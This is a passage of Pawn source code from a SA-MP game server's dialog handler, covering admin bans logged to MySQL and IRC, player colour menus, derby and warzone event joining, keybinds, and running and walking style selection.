						if (IsVIP( player[playerid][clickedplayer] ) && !IsAdmin( player[playerid][clickedplayer] )) format(tmps1, sizeof(tmps1), "VIP %s (id: %d) has been banned from the server.", giveplayername, player[playerid][clickedplayer]);
						else if (IsAdmin( player[playerid][clickedplayer] )) format(tmps1, sizeof(tmps1), "Admin %s (id: %d) has been banned from the server.", giveplayername, player[playerid][clickedplayer]);
						else format(tmps1, sizeof(tmps1), "%s (id: %d) has been banned from the server.", giveplayername, player[playerid][clickedplayer]);
					} else {
						if (IsVIP( player[playerid][clickedplayer] ) && !IsAdmin( player[playerid][clickedplayer] )) format(tmps1, sizeof(tmps1), "VIP %s (id: %d) has been banned from the server. (Reason: %s)", giveplayername, player[playerid][clickedplayer], inputtext);
						else if (IsAdmin( player[playerid][clickedplayer] )) format(tmps1, sizeof(tmps1), "Admin %s (id: %d) has been banned from the server. (Reason: %s)", giveplayername, player[playerid][clickedplayer], inputtext);
						else format(tmps1, sizeof(tmps1), "%s (id: %d) has been banned from the server. (Reason: %s)", giveplayername, player[playerid][clickedplayer], inputtext);
					}

					SendServerMessageToAll(EMBED_RED, tmps1);
					format(ircstring, sizeof(ircstring), "by %s", playername);
					SendMessageToAdmins(COLOR_RED, ircstring, 4);
					format(ircstring, sizeof(ircstring), "4,1%s by %s", tmps1, playername);
					IRC_GroupSay(1, IRCOP_CHANNEL, ircstring);
					printflog("ADM-MSG", ircstring);
				} else {
					if (!strlen(inputtext))
					{
						if (!IsPlayerAdminLevel(playerid, 5))
    					{
							ShowPlayerDialog(playerid, DIALOGID_UNKNOWN, DIALOG_STYLE_MSGBOX, ""EMBED_RED"Error", "Enter a valid reason.", "OK", "Cancel");
							player[playerid][clickedplayer] = -1;
							return 0;
						}

						if (IsVIP( player[playerid][clickedplayer] ) && !IsAdmin( player[playerid][clickedplayer] )) format(tmps1, sizeof(tmps1), "Admin %s banned VIP %s (id: %d) from the server.", playername, giveplayername, player[playerid][clickedplayer]);
						else if (IsAdmin( player[playerid][clickedplayer] )) format(tmps1, sizeof(tmps1), "Admin %s banned admin %s (id: %d) from the server.", playername, giveplayername, player[playerid][clickedplayer]);
						else format(tmps1, sizeof(tmps1), "Admin %s banned %s (id: %d) from the server.", playername, giveplayername, player[playerid][clickedplayer]);
					} else {
						if (IsVIP( player[playerid][clickedplayer] ) && !IsAdmin( player[playerid][clickedplayer] )) format(tmps1, sizeof(tmps1), "Admin %s banned VIP %s (id: %d) from the server (Reason: %s).", playername, giveplayername, player[playerid][clickedplayer], inputtext);
						else if (IsAdmin( player[playerid][clickedplayer] )) format(tmps1, sizeof(tmps1), "Admin %s banned admin %s (id: %d) from the server (Reason: %s).", playername, giveplayername, player[playerid][clickedplayer], inputtext);
						else format(tmps1, sizeof(tmps1), "Admin %s banned %s (id: %d) from the server (Reason: %s).", playername, giveplayername, player[playerid][clickedplayer], inputtext);
					}

					SendServerMessageToAll(EMBED_RED, tmps1);
					printflog("ADM-MSG", tmps1);
					format(ircstring, sizeof(ircstring), "4,1%s", tmps1);
					IRC_GroupSay(1, IRC_CHANNEL, ircstring);
				}

				new mysqlStr[533];
				if (IsPlayerRegistered(player[playerid][clickedplayer]) && IsPlayerLoggedIn(player[playerid][clickedplayer]))
				{
					format(mysqlStr, sizeof(mysqlStr), "UPDATE accounts, player_logs, preferences SET accounts.account_vip = 0, accounts.account_admin = 0, player_logs.player_log_ban_count = player_logs.player_log_ban_count +1, preferences.preference_hide = 0 WHERE accounts.account_id = %d AND player_logs.account_id = %d AND preferences.account_id = %d", GetPlayerAccountID(player[playerid][clickedplayer]), GetPlayerAccountID(player[playerid][clickedplayer]), GetPlayerAccountID(player[playerid][clickedplayer]));
					mysql_run_query(mysqlConnection, mysqlStr, false, "", "");
				}

				new ban_date[11],
				    ban_time[9],
					ban_ip[16];

				format(ban_date, sizeof(ban_date), "%d-%02d-%02d", year, month, day);
				format(ban_time, sizeof(ban_time), "%02d:%02d:%02d", hour, minute, second);
				GetPlayerIp(giveplayerid, ban_ip, sizeof(ban_ip));
				mysql_real_escape_string(giveplayername, giveplayername);
				mysql_real_escape_string(inputtext, inputtext);

				if (!strlen(inputtext)) format(mysqlStr, sizeof(mysqlStr), "INSERT INTO "MYSQL_TABLE_BANS" (account_id, ban_ip, ban_name, ban_reason, ban_issue_date, ban_issue_time, ban_expire_date, ban_expire_time, admin_id) VALUES(%d, '%s', '%s', 'No reason', '%s', '%s', '0000-00-00', '00:00:00', %d)", GetPlayerAccountID(giveplayerid), ban_ip, giveplayername, ban_date, ban_time, GetPlayerAccountID(playerid));
			    else format(mysqlStr, sizeof(mysqlStr), "INSERT INTO "MYSQL_TABLE_BANS" (account_id, ban_ip, ban_name, ban_reason, ban_issue_date, ban_issue_time, ban_expire_date, ban_expire_time, admin_id) VALUES(%d, '%s', '%s', '%s', '%s', '%s', '0000-00-00', '00:00:00', %d)", GetPlayerAccountID(giveplayerid), ban_ip, giveplayername, inputtext, ban_date, ban_time, GetPlayerAccountID(playerid));
				mysql_run_query(mysqlConnection, mysqlStr, false, "", "");

				format(tmps2, sizeof(tmps2), "You have been banned by admin %s. [Date: %d/%02d/%d Time: %02d:%02d]", playername, day, month, year, hour, minute);
				SendClientMessage(player[playerid][clickedplayer], COLOR_SEAGREEN, tmps2);
				SendClientMessage(player[playerid][clickedplayer], COLOR_ORANGE, "If you think you are wrongfully banned, appeal at www.xmovieserver.com");
				BanEx(player[playerid][clickedplayer], strings);
				SendCommandMessageToAdmins(playerid, "ban (M)");

				player[playerid][clickedplayer] = -1;
				return 1;
	        } else {
				player[playerid][clickedplayer] = -1;
				return 0;
			}
		}
		case DIALOGID_FORCECOLOUR:
		{
		    if (response)
		    {
				if (!IsPlayerAdminLevel(playerid, 4))
				{
					ShowPlayerDialog(playerid, DIALOGID_UNKNOWN, DIALOG_STYLE_MSGBOX, ""EMBED_RED"Error", "This command is inaccessible for your level.", "OK", "Cancel");
					player[playerid][clickedplayer] = -1;
					return 0;
				}
		    
				if (!IsPlayerConnected(player[playerid][clickedplayer]) || player[playerid][clickedplayer] == INVALID_PLAYER_ID)
				{
					ShowPlayerDialog(playerid, DIALOGID_UNKNOWN, DIALOG_STYLE_MSGBOX, ""EMBED_RED"Error", "The selected player is not connected (anymore).", "OK", "Cancel");
					player[playerid][clickedplayer] = -1;
					return 0;
				}

				if (player[playerid][ADMIN] < player[ player[playerid][clickedplayer] ][ADMIN])
				{
					ShowPlayerDialog(playerid, DIALOGID_UNKNOWN, DIALOG_STYLE_MSGBOX, ""EMBED_RED"Error", "The selected player has higher priveleges than you. Action cancelled.", "OK", "Cancel");
					player[playerid][clickedplayer] = -1;
					return 0;
				}

		        switch(listitem)
		        {
					case 0:		SetPlayerColor(player[playerid][clickedplayer], PlayerColors[random(sizeof(PlayerColors))]);
					case 1:		SetPlayerColor(player[playerid][clickedplayer], COLOR_WHITE);
					case 2:		SetPlayerColor(player[playerid][clickedplayer], COLOR_INVISIBLE);
					case 3:		SetPlayerColor(player[playerid][clickedplayer], COLOR_GREEN);
					case 4:		SetPlayerColor(player[playerid][clickedplayer], COLOR_RED);
					case 5:		SetPlayerColor(player[playerid][clickedplayer], COLOR_BLUE);
					case 6:		SetPlayerColor(player[playerid][clickedplayer], COLOR_PINK);
					case 7:		SetPlayerColor(player[playerid][clickedplayer], COLOR_PURPLE);
					case 8:		SetPlayerColor(player[playerid][clickedplayer], COLOR_YELLOW);
					case 9:		SetPlayerColor(player[playerid][clickedplayer], COLOR_BROWN);
					case 10:	SetPlayerColor(player[playerid][clickedplayer], COLOR_GREY);
					case 11:	SetPlayerColor(player[playerid][clickedplayer], COLOR_BLACK);
					case 12:	SetPlayerColor(player[playerid][clickedplayer], COLOR_LPINK);
					case 13:	SetPlayerColor(player[playerid][clickedplayer], COLOR_ORANGE);
					case 14:	SetPlayerColor(player[playerid][clickedplayer], COLOR_PINKRED);
					case 15:	SetPlayerColor(player[playerid][clickedplayer], COLOR_DARKRED);
					case 16:	SetPlayerColor(player[playerid][clickedplayer], COLOR_DARKERRED);
					case 17:	SetPlayerColor(player[playerid][clickedplayer], COLOR_ORANGERED);
					case 18:	SetPlayerColor(player[playerid][clickedplayer], COLOR_TOMATO);
					case 19:	SetPlayerColor(player[playerid][clickedplayer], COLOR_LIGHTBLUE);
					case 20:	SetPlayerColor(player[playerid][clickedplayer], COLOR_LIGHTNAVY);
					case 21:	SetPlayerColor(player[playerid][clickedplayer], COLOR_NAVYBLUE);
					case 22:	SetPlayerColor(player[playerid][clickedplayer], COLOR_LBLUE);
					case 23:	SetPlayerColor(player[playerid][clickedplayer], COLOR_LLBLUE);
					case 24:	SetPlayerColor(player[playerid][clickedplayer], COLOR_FLBLUE);
					case 25:	SetPlayerColor(player[playerid][clickedplayer], COLOR_BLUEVIOLET);
					case 26:	SetPlayerColor(player[playerid][clickedplayer], COLOR_BISQUE);
					case 27:	SetPlayerColor(player[playerid][clickedplayer], COLOR_LIME);
					case 28:	SetPlayerColor(player[playerid][clickedplayer], COLOR_LAWNGREEN);
					case 29:	SetPlayerColor(player[playerid][clickedplayer], COLOR_SEAGREEN);
					case 30:	SetPlayerColor(player[playerid][clickedplayer], COLOR_LIMEGREEN);
					case 31:	SetPlayerColor(player[playerid][clickedplayer], COLOR_SPRINGGREEN);
					case 32:	SetPlayerColor(player[playerid][clickedplayer], COLOR_YELLOWGREEN);
					case 33:	SetPlayerColor(player[playerid][clickedplayer], COLOR_GREENYELLOW);
					case 34:	SetPlayerColor(player[playerid][clickedplayer], COLOR_OLIVE);
					case 35:	SetPlayerColor(player[playerid][clickedplayer], COLOR_AQUA);
					case 36:	SetPlayerColor(player[playerid][clickedplayer], COLOR_MEDIUMAQUA);
					case 37:	SetPlayerColor(player[playerid][clickedplayer], COLOR_MAGENTA);
					case 38:	SetPlayerColor(player[playerid][clickedplayer], COLOR_MEDIUMMAGENTA);
					case 39:	SetPlayerColor(player[playerid][clickedplayer], COLOR_CHARTREUSE);
					case 40:	SetPlayerColor(player[playerid][clickedplayer], COLOR_CORAL);
					case 41:	SetPlayerColor(player[playerid][clickedplayer], COLOR_GOLD);
					case 42:	SetPlayerColor(player[playerid][clickedplayer], COLOR_INDIGO);
					case 43:	SetPlayerColor(player[playerid][clickedplayer], COLOR_IVORY);
		        }
				player[playerid][clickedplayer] = -1;
				return 1;
	        } else {
				player[playerid][clickedplayer] = -1;
				return 0;
			}
		}

		case DIALOGID_DERBYLIST:
		{
	        if (response)
	        {
	        	if (blockevents == true || derbylocked == true && !IsVIP(playerid) && !player[playerid][eventinvite])
				return ShowPlayerDialog(playerid, DIALOGID_UNKNOWN, DIALOG_STYLE_MSGBOX, ""EMBED_RED"Error", "An admin has currently disabled this event.", "Close", "");

				if (player[playerid][playingderby] == 1 || player[playerid][playingrr] == 1 || player[playerid][playingcc] == 1 || player[playerid][playingnb] == 1 || player[playerid][playingwarzone] == 1)
				return ShowPlayerDialog(playerid, DIALOGID_UNKNOWN, DIALOG_STYLE_MSGBOX, ""EMBED_RED"Error", "You are already participating to an event.", "Close", "");

				if (derbyplayers == DerbyMaxPlayers)
				return ShowPlayerDialog(playerid, DIALOGID_UNKNOWN, DIALOG_STYLE_MSGBOX, ""EMBED_RED"Error", "Derby is full, please wait till it ends!", "Close", "");

				if (!derbystarted)
				{
					if (!AntiSpam(playerid, 5)) return 1;

					if (derbyplayers == 0)
					{
						if (listitem < 1 || listitem > MAX_DERBIES)
					 	return ShowPlayerDialog(playerid, DIALOGID_UNKNOWN, DIALOG_STYLE_MSGBOX, ""EMBED_RED"Error", "An error occurred when choosing a derby [must be 1-100].", "Close", "");

						new derbyidstr[20];
						format(derbyidstr, sizeof(derbyidstr), "D%d", listitem);
						if (!djIsSet(DERBYFILE, derbyidstr))
						return ShowPlayerDialog(playerid, DIALOGID_UNKNOWN, DIALOG_STYLE_MSGBOX, ""EMBED_RED"Error", "There is no derby map saved in this slot.", "Close", "");
						DerbyID = listitem;

						format(derbystr, sizeof(derbystr), "D%d/Mode", DerbyID);
						if (!djIsSet(DERBYFILE, derbystr))
						{
							format(derbystr, sizeof(derbystr), "D%d/Comment", DerbyID);
						    format(strings, sizeof(strings), "No mode is set for derby \"%s\" (DerbyID %d) [/setdmode]", dj(DERBYFILE, derbystr), DerbyID);
						 	ShowPlayerDialog(playerid, DIALOGID_UNKNOWN, DIALOG_STYLE_MSGBOX, ""EMBED_RED"Error", strings, "Close", "");
							return 1;
						}
						DerbyMode = djInt(DERBYFILE, derbystr);

						format(derbystr, sizeof(derbystr), "D%d/Center/X", DerbyID); // only perform check once because X Y Z belong together
						if (!djIsSet(DERBYFILE, derbystr))
						{
							format(derbystr, sizeof(derbystr), "D%d/Comment", DerbyID);
						    format(strings, sizeof(strings), "No centerXYZ is set for derby \"%s\" (DerbyID %d) [/setdcenter]", dj(DERBYFILE, derbystr), DerbyID);
							ShowPlayerDialog(playerid, DIALOGID_UNKNOWN, DIALOG_STYLE_MSGBOX, ""EMBED_RED"Error", strings, "Close", "");
							return 1;
						}
						DerbyCenterX = djFloat(DERBYFILE, derbystr);
						format(derbystr, sizeof(derbystr), "D%d/Center/Y", DerbyID);
						DerbyCenterY = djFloat(DERBYFILE, derbystr);
						format(derbystr, sizeof(derbystr), "D%d/Center/Z", DerbyID);
						DerbyCenterZ = djFloat(DERBYFILE, derbystr);

						format(derbystr, sizeof(derbystr), "D%d/LoseHeight", DerbyID);
						if (!djIsSet(DERBYFILE, derbystr))
						{
							format(derbystr, sizeof(derbystr), "D%d/Comment", DerbyID);
						    format(strings, sizeof(strings), "No minimum height is set for derby \"%s\" (DerbyID %d) [/setdheight]", dj(DERBYFILE, derbystr), DerbyID);
							ShowPlayerDialog(playerid, DIALOGID_UNKNOWN, DIALOG_STYLE_MSGBOX, ""EMBED_RED"Error", strings, "Close", "");
							return 1;
						}
						switch(DerbyMode)
						{
							case 1: DerbyMinimumHeight = djFloat(DERBYFILE, derbystr); // Radius
							case 2: DerbyMinimumHeight = DerbyCenterZ - djFloat(DERBYFILE, derbystr); // Height only
							default:
							{
								format(derbystr, sizeof(derbystr), "D%d/Comment", DerbyID);
							    format(strings, sizeof(strings), "ServerError: ERROR #2 for derby \"%s\" (DerbyID %d)", dj(DERBYFILE, derbystr), DerbyID);
								SendServerMessageToAll(EMBED_DARKRED, strings);
								return 1;
							}
						}

				        DerbyMaxPlayers = 0; // reset before detecting how many players are allowed to join
						for (new i = 1; i < MAX_DERBY_PLAYERS+1; i++)
						{
					  		format(derbyidstr, sizeof(derbyidstr), "D%d/Spawn%d", DerbyID, i);
					  		if (i == 1 || i == 2)
					  		{
								if (!djIsSet(DERBYFILE, derbyidstr))
								{
									format(derbystr, sizeof(derbystr), "D%d/Comment", DerbyID);
								    format(strings, sizeof(strings), "No 2 spawns are set for derby \"%s\" (DerbyID %d) [/setdspawn]", dj(DERBYFILE, derbystr), DerbyID);
									ShowPlayerDialog(playerid, DIALOGID_UNKNOWN, DIALOG_STYLE_MSGBOX, ""EMBED_RED"Error", strings, "Close", "");
									DerbyMaxPlayers = -1;
									return 1;
								}
					  		}

							if (djIsSet(DERBYFILE, derbyidstr))
							DerbyMaxPlayers++;
						}

						format(derbystr, sizeof(derbystr), "D%d/Vehicle", DerbyID);
						if (!djIsSet(DERBYFILE, derbystr))
						{
							format(derbystr, sizeof(derbystr), "D%d/Comment", DerbyID);
						    format(strings, sizeof(strings), "No vehicle is set for derby \"%s\" (DerbyID %d) [/setdveh]", dj(DERBYFILE, derbystr), DerbyID);
							ShowPlayerDialog(playerid, DIALOGID_UNKNOWN, DIALOG_STYLE_MSGBOX, ""EMBED_RED"Error", strings, "Close", "");
							return 1;
						}
						DerbyVehicleID = djInt(DERBYFILE, derbystr);
					}
					ResetSelectMode(playerid);
					AddDerbyPlayer(playerid);
				} else ShowPlayerDialog(playerid, DIALOGID_UNKNOWN, DIALOG_STYLE_MSGBOX, ""EMBED_RED"Error", "Cannot start -- Derby already started.", "Close", "");
	        }
			return 1;
		}
		case DIALOGID_WARZONELIST:
		{
		    // no response check incase of bugged
		
        	if (blockevents == true || wzlocked == true && !IsVIP(playerid) && !player[playerid][eventinvite])
			return ShowPlayerDialog(playerid, DIALOGID_UNKNOWN, DIALOG_STYLE_MSGBOX, ""EMBED_RED"Error", "An admin has currently disabled this event.", "Close", "");

			if (player[playerid][playingwarzone] == 0)
			return ShowPlayerDialog(playerid, DIALOGID_UNKNOWN, DIALOG_STYLE_MSGBOX, ""EMBED_RED"Error", "You are not participating to this event.", "Close", "");

			if (!listitem)
			{
				mysql_run_query(mysqlConnection, "SELECT * FROM "MYSQL_TABLE_WARZONE_BASES"", true, "QS_LoadWarzoneBasesList", "iii", playerid, player[playerid][cinc], DIALOGID_WARZONELIST);
				return 1;
			}

			if (!warzonestarted)
			{
				if (!warzonebase)
				warzonebase = listitem;
				    
				TextDrawShowForPlayer(playerid, wzteamtd1);
				TextDrawShowForPlayer(playerid, wzteamtd2);
				TextDrawShowForPlayer(playerid, wzteamtd3);
				SelectTextDraw(playerid, COLOR_GREY);
			} else ShowPlayerDialog(playerid, DIALOGID_UNKNOWN, DIALOG_STYLE_MSGBOX, ""EMBED_RED"Error", "Cannot start -- Warzone already started.", "Close", "");
			return 1;
		}
		case DIALOGID_OSTICKS:
		{
	        if (response)
	        {
	            if (!IsAdmin(playerid))
				return ShowPlayerDialog(playerid, DIALOGID_UNKNOWN, DIALOG_STYLE_MSGBOX, ""EMBED_RED"Error", "This functionaility is currently unavailable for editing osticks.", "Close", "");
				
				if (!listitem)
				return ShowPlayerStickyObjectsList(playerid);

				if (pSObject[playerid][listitem-1][so_model] == -1)
				return ShowPlayerDialog(playerid, DIALOGID_UNKNOWN, DIALOG_STYLE_MSGBOX, ""EMBED_RED"Error", "The ID you have selected is not a valid sticky object.", "Close", "");

				GetPlayerPos(playerid, playerxyza[0], playerxyza[1], playerxyza[2]);
				SetPlayerFacingAngle(playerid, 0.00);
				SetCameraBehindPlayer(playerid);
				
				playerxyza[0] += pSObject[playerid][listitem-1][so_x];
				playerxyza[1] += pSObject[playerid][listitem-1][so_y];
				playerxyza[2] += pSObject[playerid][listitem-1][so_z];
				
				DestroyObject(pSObject[playerid][listitem-1][so_object]);
				pSObject[playerid][listitem-1][so_object] = CreateObject(pSObject[playerid][listitem-1][so_model], playerxyza[0], playerxyza[1], playerxyza[2], pSObject[playerid][listitem-1][so_rx], pSObject[playerid][listitem-1][so_ry], pSObject[playerid][listitem-1][so_rz]);
				EditObject(playerid, pSObject[playerid][listitem-1][so_object]);
				SendClientMessage(playerid, COLOR_LIME, "[INFO]: Use {FFFF00}~k~~PED_SPRINT~"EMBED_LIME" to look around and ESC to cancel selection.");
	        }
	        return 1;
		}
		case DIALOGID_POSTICKS:
		{
	        if (response)
	        {
				if (!listitem)
				return 1;
				
				if (!IsPlayerAttachedObjectSlotUsed(playerid, listitem-1))
				return ShowPlayerDialog(playerid, DIALOGID_UNKNOWN, DIALOG_STYLE_MSGBOX, ""EMBED_RED"Error", "The ID you have selected is not a valid attached object.", "Close", "");

				EditAttachedObject(playerid, listitem-1);
				SendClientMessage(playerid, COLOR_LIME, "[INFO]: Use {FFFF00}~k~~PED_SPRINT~"EMBED_LIME" to look around and ESC to cancel selection.");
	        }
	        return 1;
		}
		case DIALOGID_TELEPORTS:
		{
	        if (response)
	        {
				if (!listitem)
				return 1;

				new mysqlStr[81];
			    format(mysqlStr, sizeof(mysqlStr), "SELECT * FROM "MYSQL_TABLE_TELEPORTS" WHERE `teleport_id` = %d LIMIT 1", listitem);
				mysql_run_query(mysqlConnection, mysqlStr, true, "QS_LoadPlayerTeleport", "ii", playerid, player[playerid][cinc]);
	        }
	        return 1;
		}
		case DIALOGID_KEYBINDS:
		{
		    if (response)
			{
				if (listitem != 0)
				{
				    if (listitem == 12 || listitem == 13)
				    {
				        if (!IsVIP(playerid))
						ShowPlayerDialog(playerid, DIALOGID_UNKNOWN, DIALOG_STYLE_MSGBOX, ""EMBED_RED"Error", "This is a VIP feature.", "Close", "");
					}
				
				    if (listitem == 5)
				    ShowPlayerDialog(playerid, DIALOGID_SETMSBIND, DIALOG_STYLE_INPUT, ""EMBED_WHITE"Parameter", "Enter a speed value below:", "Set", "");
				
					SendClientMessage(playerid, COLOR_LIME, "[INFO]: Use {FFFF00}~k~~TOGGLE_SUBMISSIONS~"EMBED_LIME" to trigger the keybind.");
				}
				player[playerid][vehiclebind] = listitem;
			}
			return 1;
		}
		case DIALOGID_SETMSBIND:
		{
		    if (response)
			{
			    new Float:speed = strval(inputtext);
				if (IsVIP(playerid))
				{
					if (IsPlayerAdminLevel(playerid, 3))
					{
						if (speed > ADMIN_MAX_SPEED || speed < -ADMIN_MAX_SPEED)
						return ShowPlayerDialog(playerid, DIALOGID_SETMSBIND, DIALOG_STYLE_INPUT, ""EMBED_RED"Error", "Speed is limited from -100 to 100 ! [Premium users: increased speed from -5 to 5]", "Set", "");
					} else {
						if (speed > VIP_MAX_SPEED || speed < -VIP_MAX_SPEED)
						return ShowPlayerDialog(playerid, DIALOGID_SETMSBIND, DIALOG_STYLE_INPUT, ""EMBED_RED"Error", "Speed is limited from -1 to 1 ! [Premium users: increased speed from -5 to 5]", "Set", "");
					}
				} else {
				    speed = speed/10;
					if (speed > DEFAULT_MAX_SPEED || speed < -DEFAULT_MAX_SPEED)
					return ShowPlayerDialog(playerid, DIALOGID_SETMSBIND, DIALOG_STYLE_INPUT, ""EMBED_RED"Error", "Speed is limited from -10 to 10 ! [Premium users: increased speed from -50 to 50]", "Set", "");
				}
				player[playerid][savedms] = speed;
			} else {
				if (IsVIP(playerid))
				{
					if (IsPlayerAdminLevel(playerid, 3)) return ShowPlayerDialog(playerid, DIALOGID_SETMSBIND, DIALOG_STYLE_INPUT, ""EMBED_RED"Error", "Speed is limited from -100 to 100 ! [Premium users: increased speed from -5 to 5]", "Set", "");
					else return ShowPlayerDialog(playerid, DIALOGID_SETMSBIND, DIALOG_STYLE_INPUT, ""EMBED_RED"Error", "Speed is limited from -1 to 1 ! [Premium users: increased speed from -5 to 5]", "Set", "");
				} else return ShowPlayerDialog(playerid, DIALOGID_SETMSBIND, DIALOG_STYLE_INPUT, ""EMBED_RED"Error", "Speed is limited from -10 to 10 ! [Premium users: increased speed from -50 to 50]", "Set", "");
			}
		}
		case DIALOGID_COLOUR:
		{
		    if (response)
		    {
		        switch(listitem)
		        {
					case 0:		SetPlayerColor(playerid, PlayerColors[random(sizeof(PlayerColors))]);
					case 1:		SetPlayerColor(playerid, COLOR_WHITE);
					case 2:		SetPlayerColor(playerid, COLOR_INVISIBLE);
					case 3:		SetPlayerColor(playerid, COLOR_GREEN);
					case 4:		SetPlayerColor(playerid, COLOR_RED);
					case 5:		SetPlayerColor(playerid, COLOR_BLUE);
					case 6:		SetPlayerColor(playerid, COLOR_PINK);
					case 7:		SetPlayerColor(playerid, COLOR_PURPLE);
					case 8:		SetPlayerColor(playerid, COLOR_YELLOW);
					case 9:		SetPlayerColor(playerid, COLOR_BROWN);
					case 10:	SetPlayerColor(playerid, COLOR_GREY);
					case 11:	SetPlayerColor(playerid, COLOR_BLACK);
					case 12:	SetPlayerColor(playerid, COLOR_LPINK);
					case 13:	SetPlayerColor(playerid, COLOR_ORANGE);
					case 14:	SetPlayerColor(playerid, COLOR_PINKRED);
					case 15:	SetPlayerColor(playerid, COLOR_DARKRED);
					case 16:	SetPlayerColor(playerid, COLOR_DARKERRED);
					case 17:	SetPlayerColor(playerid, COLOR_ORANGERED);
					case 18:	SetPlayerColor(playerid, COLOR_TOMATO);
					case 19:	SetPlayerColor(playerid, COLOR_LIGHTBLUE);
					case 20:	SetPlayerColor(playerid, COLOR_LIGHTNAVY);
					case 21:	SetPlayerColor(playerid, COLOR_NAVYBLUE);
					case 22:	SetPlayerColor(playerid, COLOR_LBLUE);
					case 23:	SetPlayerColor(playerid, COLOR_LLBLUE);
					case 24:	SetPlayerColor(playerid, COLOR_FLBLUE);
					case 25:	SetPlayerColor(playerid, COLOR_BLUEVIOLET);
					case 26:	SetPlayerColor(playerid, COLOR_BISQUE);
					case 27:	SetPlayerColor(playerid, COLOR_LIME);
					case 28:	SetPlayerColor(playerid, COLOR_LAWNGREEN);
					case 29:	SetPlayerColor(playerid, COLOR_SEAGREEN);
					case 30:	SetPlayerColor(playerid, COLOR_LIMEGREEN);
					case 31:	SetPlayerColor(playerid, COLOR_SPRINGGREEN);
					case 32:	SetPlayerColor(playerid, COLOR_YELLOWGREEN);
					case 33:	SetPlayerColor(playerid, COLOR_GREENYELLOW);
					case 34:	SetPlayerColor(playerid, COLOR_OLIVE);
					case 35:	SetPlayerColor(playerid, COLOR_AQUA);
					case 36:	SetPlayerColor(playerid, COLOR_MEDIUMAQUA);
					case 37:	SetPlayerColor(playerid, COLOR_MAGENTA);
					case 38:	SetPlayerColor(playerid, COLOR_MEDIUMMAGENTA);
					case 39:	SetPlayerColor(playerid, COLOR_CHARTREUSE);
					case 40:	SetPlayerColor(playerid, COLOR_CORAL);
					case 41:	SetPlayerColor(playerid, COLOR_GOLD);
					case 42:	SetPlayerColor(playerid, COLOR_INDIGO);
					case 43:	SetPlayerColor(playerid, COLOR_IVORY);
		        }
		    }
		    return 1;
		}
		case DIALOGID_PCOLOUR:
		{
		    if (response)
		    {
	            player[playerid][pcolour] = listitem;
			}
			return 1;
		}
		case DIALOGID_RUNNINGSTYLE:
		{
		    if (response)
		    {
				player[playerid][running] = listitem;
				switch (listitem)
				{
					case 0: SendServerMessage(playerid, EMBED_IVORY, "Running style set to \"Normal (CJ)\". (Press "EMBED_RED"~k~~PED_SPRINT~"EMBED_IVORY" to start running)");
					case 1: SendServerMessage(playerid, EMBED_IVORY, "Running style set to \"Normal (Armed - no boobs)\". (Press "EMBED_RED"~k~~PED_SPRINT~"EMBED_IVORY" to start running)");
					case 2: SendServerMessage(playerid, EMBED_IVORY, "Running style set to \"Normal (Civilian)\". (Press "EMBED_RED"~k~~PED_SPRINT~"EMBED_IVORY" to start running)");
					case 3: SendServerMessage(playerid, EMBED_IVORY, "Running style set to \"Normal (Gang)\". (Press "EMBED_RED"~k~~PED_SPRINT~"EMBED_IVORY" to start running)");
					case 4: SendServerMessage(playerid, EMBED_IVORY, "Running style set to \"Normal (Swat)\". (Press "EMBED_RED"~k~~PED_SPRINT~"EMBED_IVORY" to start running)");
					case 5: SendServerMessage(playerid, EMBED_IVORY, "Running style set to \"Normal (Panic)\". (Press "EMBED_RED"~k~~PED_SPRINT~"EMBED_IVORY" to start running)");
					case 6: SendServerMessage(playerid, EMBED_IVORY, "Running style set to \"Jog (Female)\". (Press "EMBED_RED"~k~~PED_SPRINT~"EMBED_IVORY" to start running)");
					case 7: SendServerMessage(playerid, EMBED_IVORY, "Running style set to \"Jog (Male)\". (Press "EMBED_RED"~k~~PED_SPRINT~"EMBED_IVORY" to start running)");
					case 8: SendServerMessage(playerid, EMBED_IVORY, "Running style set to \"Fat\". (Press "EMBED_RED"~k~~PED_SPRINT~"EMBED_IVORY" to start running)");
					case 9: SendServerMessage(playerid, EMBED_IVORY, "Running style set to \"Fat & old\". (Press "EMBED_RED"~k~~PED_SPRINT~"EMBED_IVORY" to start running)");
					case 10: SendServerMessage(playerid, EMBED_IVORY, "Running style set to \"Old\". (Press "EMBED_RED"~k~~PED_SPRINT~"EMBED_IVORY" to start running)");
					case 11: SendServerMessage(playerid, EMBED_IVORY, "Running style set to \"Blind (Slow)\". (Press "EMBED_RED"~k~~PED_SPRINT~"EMBED_IVORY" to start running)");
					case 12: SendServerMessage(playerid, EMBED_IVORY, "Running style set to \"Blind (Fast)\". (Press "EMBED_RED"~k~~PED_SPRINT~"EMBED_IVORY" to start running)");
					case 13: SendServerMessage(playerid, EMBED_IVORY, "Running style set to \"Lady 1\". (Press "EMBED_RED"~k~~PED_SPRINT~"EMBED_IVORY" to start running)");
					case 14: SendServerMessage(playerid, EMBED_IVORY, "Running style set to \"Lady 2\". (Press "EMBED_RED"~k~~PED_SPRINT~"EMBED_IVORY" to start running)");
					case 15: SendServerMessage(playerid, EMBED_IVORY, "Running style set to \"Lady 3\". (Press "EMBED_RED"~k~~PED_SPRINT~"EMBED_IVORY" to start running)");
					case 16: SendServerMessage(playerid, EMBED_IVORY, "Running style set to \"Lady 4\". (Press "EMBED_RED"~k~~PED_SPRINT~"EMBED_IVORY" to start running)");
					case 17: SendServerMessage(playerid, EMBED_IVORY, "Running style set to \"Moonwalk (forward)\". (Press "EMBED_RED"~k~~PED_SPRINT~"EMBED_IVORY" to start running)");
					case 18: SendServerMessage(playerid, EMBED_IVORY, "Running style set to \"Armed (Shotgun)\". (Press "EMBED_RED"~k~~PED_SPRINT~"EMBED_IVORY" to start running)");
					case 19: SendServerMessage(playerid, EMBED_IVORY, "Running style set to \"Armed (Chainsaw)\". (Press "EMBED_RED"~k~~PED_SPRINT~"EMBED_IVORY" to start running)");
					case 20: SendServerMessage(playerid, EMBED_IVORY, "Running style set to \"Armed (RPG)\". (Press "EMBED_RED"~k~~PED_SPRINT~"EMBED_IVORY" to start running)");
				}
				return 1;
	        }
		}
		case DIALOGID_WALKINGSTYLE:
		{
		    if (response)
		    {
				player[playerid][walking] = listitem;
				switch (listitem)
				{
					case 0: SendServerMessage(playerid, EMBED_IVORY, "Walking style set to \"Normal (CJ)\". (Press "EMBED_RED"~k~~SNEAK_ABOUT~"EMBED_IVORY" to start walking)");
					case 1: SendServerMessage(playerid, EMBED_IVORY, "Walking style set to \"Normal (Civilian)\". (Press "EMBED_RED"~k~~SNEAK_ABOUT~"EMBED_IVORY" to start walking)");
